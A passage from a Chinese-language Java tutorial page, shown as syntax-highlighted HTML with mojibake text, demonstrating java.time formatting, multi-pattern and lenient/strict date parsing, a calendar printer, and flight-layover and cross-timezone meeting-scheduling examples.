            .appendLiteral(<span class="hljs-string">"æ—¥"</span>)
            .appendLiteral(<span class="hljs-string">" æ—¶é—´: "</span>)
            .appendValue(ChronoField.HOUR_OF_DAY, <span class="hljs-number">2</span>)
            .appendLiteral(<span class="hljs-string">":"</span>)
            .appendValue(ChronoField.MINUTE_OF_HOUR, <span class="hljs-number">2</span>)
            .appendLiteral(<span class="hljs-string">":"</span>)
            .appendValue(ChronoField.SECOND_OF_MINUTE, <span class="hljs-number">2</span>)
            .optionalStart() <span class="hljs-comment">// å¯é€‰éƒ¨åˆ†</span>
            .appendLiteral(<span class="hljs-string">"."</span>)
            .appendValue(ChronoField.MILLI_OF_SECOND, <span class="hljs-number">3</span>)
            .optionalEnd()
            .toFormatter();
        
        System.out.println(<span class="hljs-string">"å¤æ‚æ ¼å¼åŒ–: "</span> + complexFormatter.format(now));
        
        <span class="hljs-comment">// 5. è§£ææ—¥æœŸæ—¶é—´</span>
        System.out.println(<span class="hljs-string">"\n5. è§£ææ—¥æœŸæ—¶é—´:"</span>);
        
        String[] dateStrings = {
            <span class="hljs-string">"2023-11-15"</span>,
            <span class="hljs-string">"15/11/2023"</span>,
            <span class="hljs-string">"2023å¹´11æœˆ15æ—¥"</span>,
            <span class="hljs-string">"2023-11-15 14:30:45"</span>,
            <span class="hljs-string">"November 15, 2023"</span>
        };
        
        DateTimeFormatter[] parsers = {
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"dd/MM/yyyy"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyyå¹´MMæœˆddæ—¥"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>),
            DateTimeFormatter.ofPattern(<span class="hljs-string">"MMMM dd, yyyy"</span>, Locale.US)
        };
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; dateStrings.length; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">TemporalAccessor</span> <span class="hljs-variable">parsed</span> <span class="hljs-operator">=</span> parsers[i].parse(dateStrings[i]);
                System.out.println(dateStrings[i] + <span class="hljs-string">" -&gt; è§£ææˆåŠŸ"</span>);
            } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
                System.out.println(dateStrings[i] + <span class="hljs-string">" -&gt; è§£æå¤±è´¥: "</span> + e.getMessage());
            }
        }
        
        <span class="hljs-comment">// 6. å®½æ¾è§£æä¸ä¸¥æ ¼è§£æ</span>
        System.out.println(<span class="hljs-string">"\n6. å®½æ¾è§£æä¸ä¸¥æ ¼è§£æ:"</span>);
        
        <span class="hljs-type">String</span> <span class="hljs-variable">looseDate</span> <span class="hljs-operator">=</span> <span class="hljs-string">"2023-2-31"</span>; <span class="hljs-comment">// 2æœˆ31æ—¥ä¸å­˜åœ¨</span>
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">lenientFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-M-d"</span>)
            .withResolverStyle(ResolverStyle.LENIENT);
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">strictFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-M-d"</span>)
            .withResolverStyle(ResolverStyle.STRICT);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">LocalDate</span> <span class="hljs-variable">parsedLenient</span> <span class="hljs-operator">=</span> LocalDate.parse(looseDate, lenientFormatter);
            System.out.println(<span class="hljs-string">"å®½æ¾è§£ææˆåŠŸ: "</span> + parsedLenient); <span class="hljs-comment">// ä¼šè‡ªåŠ¨è°ƒæ•´åˆ°3æœˆ3æ—¥</span>
        } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
            System.out.println(<span class="hljs-string">"å®½æ¾è§£æå¤±è´¥: "</span> + e.getMessage());
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">LocalDate</span> <span class="hljs-variable">parsedStrict</span> <span class="hljs-operator">=</span> LocalDate.parse(looseDate, strictFormatter);
            System.out.println(<span class="hljs-string">"ä¸¥æ ¼è§£ææˆåŠŸ: "</span> + parsedStrict);
        } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
            System.out.println(<span class="hljs-string">"ä¸¥æ ¼è§£æå¤±è´¥: "</span> + e.getMessage());
        }
        
        <span class="hljs-comment">// 7. å®é™…åº”ç”¨ï¼šå¤šæ ¼å¼è§£æå™¨</span>
        System.out.println(<span class="hljs-string">"\n7. å¤šæ ¼å¼è§£æå™¨:"</span>);
        
        String[] possibleFormats = {
            <span class="hljs-string">"yyyy-MM-dd"</span>,
            <span class="hljs-string">"yyyy/MM/dd"</span>,
            <span class="hljs-string">"dd-MM-yyyy"</span>,
            <span class="hljs-string">"dd/MM/yyyy"</span>,
            <span class="hljs-string">"yyyy.MM.dd"</span>,
            <span class="hljs-string">"MMM dd, yyyy"</span>,
            <span class="hljs-string">"dd MMM yyyy"</span>
        };
        
        <span class="hljs-type">String</span> <span class="hljs-variable">testDate</span> <span class="hljs-operator">=</span> <span class="hljs-string">"15/11/2023"</span>;
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parseWithMultipleFormats(testDate, possibleFormats);
        System.out.println(<span class="hljs-string">"å¤šæ ¼å¼è§£æç»“æœ: "</span> + result);
        
        <span class="hljs-comment">// 8. è‡ªå®šä¹‰æ ¼å¼åŒ–æ‰©å±•</span>
        System.out.println(<span class="hljs-string">"\n8. è‡ªå®šä¹‰æ ¼å¼åŒ–æ‰©å±•:"</span>);
        
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">customFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd"</span>)
            .withZone(ZoneId.of(<span class="hljs-string">"Asia/Shanghai"</span>))
            .withDecimalStyle(DecimalStyle.STANDARD)
            .withChronology(IsoChronology.INSTANCE);
        
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">zonedDateTime</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">"Asia/Shanghai"</span>));
        System.out.println(<span class="hljs-string">"å¸¦æ—¶åŒºæ ¼å¼åŒ–: "</span> + customFormatter.format(zonedDateTime));
    }
    
    <span class="hljs-comment">// å¤šæ ¼å¼è§£æå™¨å®ç°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LocalDate <span class="hljs-title function_">parseWithMultipleFormats</span><span class="hljs-params">(String dateString, String[] formats)</span> {
        <span class="hljs-keyword">for</span> (String format : formats) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(format);
                <span class="hljs-keyword">return</span> LocalDate.parse(dateString, formatter);
            } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
                <span class="hljs-comment">// ç»§ç»­å°è¯•ä¸‹ä¸€ä¸ªæ ¼å¼</span>
                <span class="hljs-keyword">continue</span>;
            }
        }
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"æ— æ³•è§£ææ—¥æœŸ: "</span> + dateString);
    }
    
    <span class="hljs-comment">// æ™ºèƒ½æ—¥æœŸè§£æ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LocalDate <span class="hljs-title function_">smartDateParse</span><span class="hljs-params">(String input)</span> {
        <span class="hljs-comment">// ç§»é™¤å¸¸è§çš„åˆ†éš”ç¬¦ï¼Œç»Ÿä¸€å¤„ç†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">normalized</span> <span class="hljs-operator">=</span> input.replaceAll(<span class="hljs-string">"[/.-]"</span>, <span class="hljs-string">"-"</span>);
        
        <span class="hljs-comment">// å°è¯•å¸¸è§æ ¼å¼</span>
        String[] patterns = {
            <span class="hljs-string">"yyyy-MM-dd"</span>,
            <span class="hljs-string">"yyyy-M-d"</span>,
            <span class="hljs-string">"yy-MM-dd"</span>,
            <span class="hljs-string">"yy-M-d"</span>,
            <span class="hljs-string">"MM-dd-yyyy"</span>,
            <span class="hljs-string">"M-d-yyyy"</span>,
            <span class="hljs-string">"dd-MM-yyyy"</span>,
            <span class="hljs-string">"d-M-yyyy"</span>
        };
        
        <span class="hljs-keyword">for</span> (String pattern : patterns) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(pattern);
                <span class="hljs-keyword">return</span> LocalDate.parse(normalized, formatter);
            } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
                <span class="hljs-keyword">continue</span>;
            }
        }
        
        <span class="hljs-comment">// å°è¯•æ–‡æœ¬æœˆä»½</span>
        patterns = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{
            <span class="hljs-string">"MMM dd, yyyy"</span>,
            <span class="hljs-string">"MMM d, yyyy"</span>,
            <span class="hljs-string">"MMMM dd, yyyy"</span>,
            <span class="hljs-string">"MMMM d, yyyy"</span>,
            <span class="hljs-string">"dd MMM yyyy"</span>,
            <span class="hljs-string">"d MMM yyyy"</span>
        };
        
        <span class="hljs-keyword">for</span> (String pattern : patterns) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(pattern, Locale.ENGLISH);
                <span class="hljs-keyword">return</span> LocalDate.parse(input, formatter);
            } <span class="hljs-keyword">catch</span> (DateTimeParseException e) {
                <span class="hljs-keyword">continue</span>;
            }
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"æ— æ³•è¯†åˆ«çš„æ—¥æœŸæ ¼å¼: "</span> + input);
    }
    
    <span class="hljs-comment">// ç”Ÿæˆå¯è¯»çš„æ—¶é—´é—´éš”æè¿°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">formatTimeAgo</span><span class="hljs-params">(LocalDateTime pastTime)</span> {
        <span class="hljs-type">Duration</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> Duration.between(pastTime, LocalDateTime.now());
        
        <span class="hljs-keyword">if</span> (duration.toDays() &gt; <span class="hljs-number">365</span>) {
            <span class="hljs-type">long</span> <span class="hljs-variable">years</span> <span class="hljs-operator">=</span> duration.toDays() / <span class="hljs-number">365</span>;
            <span class="hljs-keyword">return</span> years + <span class="hljs-string">"å¹´å‰"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toDays() &gt; <span class="hljs-number">30</span>) {
            <span class="hljs-type">long</span> <span class="hljs-variable">months</span> <span class="hljs-operator">=</span> duration.toDays() / <span class="hljs-number">30</span>;
            <span class="hljs-keyword">return</span> months + <span class="hljs-string">"ä¸ªæœˆå‰"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toDays() &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> duration.toDays() + <span class="hljs-string">"å¤©å‰"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toHours() &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> duration.toHours() + <span class="hljs-string">"å°æ—¶å‰"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (duration.toMinutes() &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> duration.toMinutes() + <span class="hljs-string">"åˆ†é’Ÿå‰"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"åˆšåˆš"</span>;
        }
    }
    
    <span class="hljs-comment">// ç”Ÿæˆæ—¥å†è§†å›¾</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printCalendar</span><span class="hljs-params">(<span class="hljs-type">int</span> year, <span class="hljs-type">int</span> month)</span> {
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">firstDay</span> <span class="hljs-operator">=</span> LocalDate.of(year, month, <span class="hljs-number">1</span>);
        <span class="hljs-type">DayOfWeek</span> <span class="hljs-variable">firstDayOfWeek</span> <span class="hljs-operator">=</span> firstDay.getDayOfWeek();
        <span class="hljs-type">int</span> <span class="hljs-variable">daysInMonth</span> <span class="hljs-operator">=</span> firstDay.lengthOfMonth();
        
        System.out.printf(<span class="hljs-string">"\n     %då¹´ %dæœˆ\n"</span>, year, month);
        System.out.println(<span class="hljs-string">"æ—¥ ä¸€ äºŒ ä¸‰ å›› äº” å…­"</span>);
        
        <span class="hljs-comment">// æ‰“å°å‰é¢çš„ç©ºç™½</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; firstDayOfWeek.getValue() % <span class="hljs-number">7</span>; i++) {
            System.out.print(<span class="hljs-string">"   "</span>);
        }
        
        <span class="hljs-comment">// æ‰“å°æ—¥æœŸ</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">day</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; day &lt;= daysInMonth; day++) {
            System.out.printf(<span class="hljs-string">"%2d "</span>, day);
            
            <span class="hljs-comment">// æ¢è¡Œ</span>
            <span class="hljs-keyword">if</span> ((firstDayOfWeek.getValue() % <span class="hljs-number">7</span> + day) % <span class="hljs-number">7</span> == <span class="hljs-number">0</span>) {
                System.out.println();
            }
        }
        System.out.println();
    }
}
</code></pre>
<h2 data-id="heading-17">å®æˆ˜ï¼šå®Œæ•´çš„ä¼ä¸šçº§åº”ç”¨</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.*;
<span class="hljs-keyword">import</span> java.time.temporal.*;
<span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.util.concurrent.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnterpriseDateTimeApplication</span> {
    
    <span class="hljs-comment">// 1. èˆªç­é¢„è®¢ç³»ç»Ÿ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlightBookingSystem</span> {
        
        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Flight</span> {
            String flightNumber;
            String airline;
            String departureAirport;
            String arrivalAirport;
            ZonedDateTime departureTime;
            ZonedDateTime arrivalTime;
            Duration flightDuration;
            
            <span class="hljs-keyword">public</span> <span class="hljs-title function_">Flight</span><span class="hljs-params">(String flightNumber, String airline, String departureAirport, 
                         String arrivalAirport, ZonedDateTime departureTime, 
                         ZonedDateTime arrivalTime)</span> {
                <span class="hljs-built_in">this</span>.flightNumber = flightNumber;
                <span class="hljs-built_in">this</span>.airline = airline;
                <span class="hljs-built_in">this</span>.departureAirport = departureAirport;
                <span class="hljs-built_in">this</span>.arrivalAirport = arrivalAirport;
                <span class="hljs-built_in">this</span>.departureTime = departureTime;
                <span class="hljs-built_in">this</span>.arrivalTime = arrivalTime;
                <span class="hljs-built_in">this</span>.flightDuration = Duration.between(departureTime, arrivalTime);
            }
            
            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isOverlapping</span><span class="hljs-params">(Flight other)</span> {
                <span class="hljs-keyword">return</span> !(<span class="hljs-built_in">this</span>.arrivalTime.isBefore(other.departureTime) || 
                        <span class="hljs-built_in">this</span>.departureTime.isAfter(other.arrivalTime));
            }
            
            <span class="hljs-keyword">public</span> Duration <span class="hljs-title function_">getLayoverTime</span><span class="hljs-params">(Flight connectingFlight)</span> {
                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.arrivalAirport.equals(connectingFlight.departureAirport)) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"ä¸æ˜¯è¿ç»­çš„èˆªç­"</span>);
                }
                <span class="hljs-keyword">return</span> Duration.between(<span class="hljs-built_in">this</span>.arrivalTime, connectingFlight.departureTime);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm (zzz)"</span>);
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%s %s: %s [%s] -&gt; %s [%s] æ—¶é•¿: %s"</span>,
                    airline, flightNumber,
                    departureTime.format(formatter),
                    departureAirport,
                    arrivalTime.format(formatter),
                    arrivalAirport,
                    formatDuration(flightDuration));
            }
            
            <span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatDuration</span><span class="hljs-params">(Duration duration)</span> {
                <span class="hljs-type">long</span> <span class="hljs-variable">hours</span> <span class="hljs-operator">=</span> duration.toHours();
                <span class="hljs-type">long</span> <span class="hljs-variable">minutes</span> <span class="hljs-operator">=</span> duration.toMinutesPart();
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%då°æ—¶%dåˆ†é’Ÿ"</span>, hours, minutes);
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bookFlight</span><span class="hljs-params">()</span> {
            System.out.println(<span class="hljs-string">"=== èˆªç­é¢„è®¢ç³»ç»Ÿ ==="</span>);
            
            <span class="hljs-comment">// å®šä¹‰èˆªç­</span>
            <span class="hljs-type">Flight</span> <span class="hljs-variable">flight1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flight</span>(
                <span class="hljs-string">"CA123"</span>,
                <span class="hljs-string">"ä¸­å›½èˆªç©º"</span>,
                <span class="hljs-string">"åŒ—äº¬é¦–éƒ½å›½é™…æœºåœº (PEK)"</span>,
                <span class="hljs-string">"ä¸Šæµ·æµ¦ä¸œå›½é™…æœºåœº (PVG)"</span>,
                ZonedDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ZoneId.of(<span class="hljs-string">"Asia/Shanghai"</span>)),
                ZonedDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ZoneId.of(<span class="hljs-string">"Asia/Shanghai"</span>))
            );
            
            <span class="hljs-type">Flight</span> <span class="hljs-variable">flight2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flight</span>(
                <span class="hljs-string">"AA789"</span>,
                <span class="hljs-string">"ç¾å›½èˆªç©º"</span>,
                <span class="hljs-string">"ä¸Šæµ·æµ¦ä¸œå›½é™…æœºåœº (PVG)"</span>,
                <span class="hljs-string">"çº½çº¦è‚¯å°¼è¿ªæœºåœº (JFK)"</span>,
                ZonedDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">13</span>, <span class="hljs-number">30</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ZoneId.of(<span class="hljs-string">"Asia/Shanghai"</span>)),
                ZonedDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ZoneId.of(<span class="hljs-string">"America/New_York"</span>))
            );
            
            System.out.println(<span class="hljs-string">"èˆªç­1: "</span> + flight1);
            System.out.println(<span class="hljs-string">"èˆªç­2: "</span> + flight2);
            
            <span class="hljs-comment">// æ£€æŸ¥è½¬æœºæ—¶é—´</span>
            <span class="hljs-type">Duration</span> <span class="hljs-variable">layover</span> <span class="hljs-operator">=</span> flight1.getLayoverTime(flight2);
            System.out.println(<span class="hljs-string">"\nè½¬æœºæ—¶é—´: "</span> + 
                layover.toHours() + <span class="hljs-string">"å°æ—¶"</span> + layover.toMinutesPart() + <span class="hljs-string">"åˆ†é’Ÿ"</span>);
            
            <span class="hljs-keyword">if</span> (layover.toHours() &lt; <span class="hljs-number">1</span>) {
                System.out.println(<span class="hljs-string">"âš ï¸ è­¦å‘Šï¼šè½¬æœºæ—¶é—´å¤ªçŸ­ï¼"</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (layover.toHours() &gt; <span class="hljs-number">4</span>) {
                System.out.println(<span class="hljs-string">"âš ï¸ è­¦å‘Šï¼šè½¬æœºæ—¶é—´å¤ªé•¿ï¼"</span>);
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"âœ“ è½¬æœºæ—¶é—´åˆé€‚"</span>);
            }
            
            <span class="hljs-comment">// æ˜¾ç¤ºåˆ°è¾¾ç›®çš„åœ°çš„æ—¶é—´ï¼ˆæŒ‰ç›®çš„åœ°æ—¶åŒºï¼‰</span>
            <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">arrivalInLocalTime</span> <span class="hljs-operator">=</span> flight2.arrivalTime
                .withZoneSameInstant(ZoneId.of(<span class="hljs-string">"America/New_York"</span>));
            System.out.println(<span class="hljs-string">"\nåˆ°è¾¾çº½çº¦æ—¶é—´: "</span> + 
                arrivalInLocalTime.format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm (zzz)"</span>)));
        }
    }
    
    <span class="hljs-comment">// 2. ä¼šè®®è°ƒåº¦ç³»ç»Ÿ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MeetingScheduler</span> {
        
        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Meeting</span> {
            String title;
            String organizer;
            ZonedDateTime startTime;
            Duration duration;
            Set&lt;String&gt; participants;
            String location;
            
            <span class="hljs-keyword">public</span> <span class="hljs-title function_">Meeting</span><span class="hljs-params">(String title, String organizer, ZonedDateTime startTime, 
                          Duration duration, Set&lt;String&gt; participants, String location)</span> {
                <span class="hljs-built_in">this</span>.title = title;
                <span class="hljs-built_in">this</span>.organizer = organizer;
                <span class="hljs-built_in">this</span>.startTime = startTime;
                <span class="hljs-built_in">this</span>.duration = duration;
                <span class="hljs-built_in">this</span>.participants = participants;
                <span class="hljs-built_in">this</span>.location = location;
            }
            
            <span class="hljs-keyword">public</span> ZonedDateTime <span class="hljs-title function_">getEndTime</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> startTime.plus(duration);
            }
            
            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">conflictsWith</span><span class="hljs-params">(Meeting other)</span> {
                <span class="hljs-keyword">return</span> !(<span class="hljs-built_in">this</span>.getEndTime().isBefore(other.startTime) || 
                        <span class="hljs-built_in">this</span>.startTime.isAfter(other.getEndTime()));
            }
            
            <span class="hljs-keyword">public</span> Map&lt;String, ZonedDateTime&gt; <span class="hljs-title function_">getLocalTimesForParticipants</span><span class="hljs-params">()</span> {
                Map&lt;String, ZonedDateTime&gt; localTimes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
                
                <span class="hljs-comment">// æ¨¡æ‹Ÿä»æ•°æ®åº“è·å–å‚ä¸è€…æ—¶åŒº</span>
                Map&lt;String, String&gt; participantTimezones = Map.of(
                    <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"Asia/Shanghai"</span>,
                    <span class="hljs-string">"æå››"</span>, <span class="hljs-string">"America/New_York"</span>,
                    <span class="hljs-string">"ç‹äº”"</span>, <span class="hljs-string">"Europe/London"</span>,
                    <span class="hljs-string">"å±±ç”°"</span>, <span class="hljs-string">"Asia/Tokyo"</span>
                );
                
                <span class="hljs-keyword">for</span> (String participant : participants) {
                    <span class="hljs-type">String</span> <span class="hljs-variable">timezone</span> <span class="hljs-operator">=</span> participantTimezones.getOrDefault(participant, <span class="hljs-string">"UTC"</span>);
                    localTimes.put(participant, 
                        startTime.withZoneSameInstant(ZoneId.of(timezone)));
                }
                
                <span class="hljs-keyword">return</span> localTimes;
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
                <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm (zzz)"</span>);
                <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"ä¼šè®®: %s\nç»„ç»‡è€…: %s\næ—¶é—´: %s - %s\nåœ°ç‚¹: %s\nå‚ä¸è€…: %s"</span>,
                    title, organizer,
                    startTime.format(formatter),
                    getEndTime().format(formatter),
                    location,
                    String.join(<span class="hljs-string">", "</span>, participants));
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleMeeting</span><span class="hljs-params">()</span> {
            System.out.println(<span class="hljs-string">"\n=== ä¼šè®®è°ƒåº¦ç³»ç»Ÿ ==="</span>);
            
            Set&lt;String&gt; participants = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(Arrays.asList(
                <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"æå››"</span>, <span class="hljs-string">"ç‹äº”"</span>, <span class="hljs-string">"å±±ç”°"</span>
            ));
            
            <span class="hljs-type">Meeting</span> <span class="hljs-variable">meeting</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Meeting</span>(
                <span class="hljs-string">"å­£åº¦é¡¹ç›®è¯„å®¡"</span>,
                <span class="hljs-string">"å¼ ä¸‰"</span>,
                ZonedDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ZoneId.of(<span class="hljs-string">"Asia/Shanghai"</span>)),
                Duration.ofHours(<span class="hljs-number">2</span>),
                participants,
                <span class="hljs-string">"ä¼šè®®å®¤A"</span>
            );
            
            System.out.println(meeting);
            
            <span class="hljs-comment">// æ˜¾ç¤ºå„å‚ä¸è€…çš„æœ¬åœ°æ—¶é—´</span>
            System.out.println(<span class="hljs-string">"\nå„å‚ä¸è€…çš„æœ¬åœ°æ—¶é—´:"</span>);
            Map&lt;String, ZonedDateTime&gt; localTimes = meeting.getLocalTimesForParticipants();
            
            <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">timeFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"HH:mm"</span>);
            <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">dateFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"MMæœˆddæ—¥"</span>);
            
            <span class="hljs-keyword">for</span> (Map.Entry&lt;String, ZonedDateTime&gt; entry : localTimes.entrySet()) {
                <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">localTime</span> <span class="hljs-operator">=</span> entry.getValue();
                System.out.printf(<span class="hljs-string">"%-8s: %s %s%n"</span>,
                    entry.getKey(),
                    localTime.format(dateFormatter),
                    localTime.format(timeFormatter));
            }
            
            <span class="hljs-comment">// æ£€æŸ¥æ—¶é—´æ˜¯å¦åˆé€‚</span>
            System.out.println(<span class="hljs-string">"\næ—¶é—´åˆé€‚æ€§æ£€æŸ¥:"</span>);
            <span class="hljs-keyword">for</span> (Map.Entry&lt;String, ZonedDateTime&gt; entry : localTimes.entrySet()) {
                <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">localTime</span> <span class="hljs-operator">=</span> entry.getValue();
                <span class="hljs-type">LocalTime</span> <span class="hljs-variable">meetingLocalTime</span> <span class="hljs-operator">=</span> localTime.toLocalTime();
                
                <span class="hljs-type">boolean</span> <span class="hljs-variable">isWorkingHour</span> <span class="hljs-operator">=</span> meetingLocalTime.isAfter(LocalTime.of(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>)) &amp;&amp;
                                       meetingLocalTime.isBefore(LocalTime.of(<span class="hljs-number">18</span>, <span class="hljs-number">0</span>));
                
                System.out.printf(<span class="hljs-string">"%-8s: %s (%s)%n"</span>,
                    entry.getKey(),
                    isWorkingHour ? <span class="hljs-string">"âœ“ å·¥ä½œæ—¶é—´"</span> : <span class="hljs-string">"âš ï¸ éå·¥ä½œæ—¶é—´"</span>,
                    meetingLocalTime.format(DateTimeFormatter.ofPattern(<span class="hljs-string">"HH:mm"</span>)));
            }
        }
    }
    
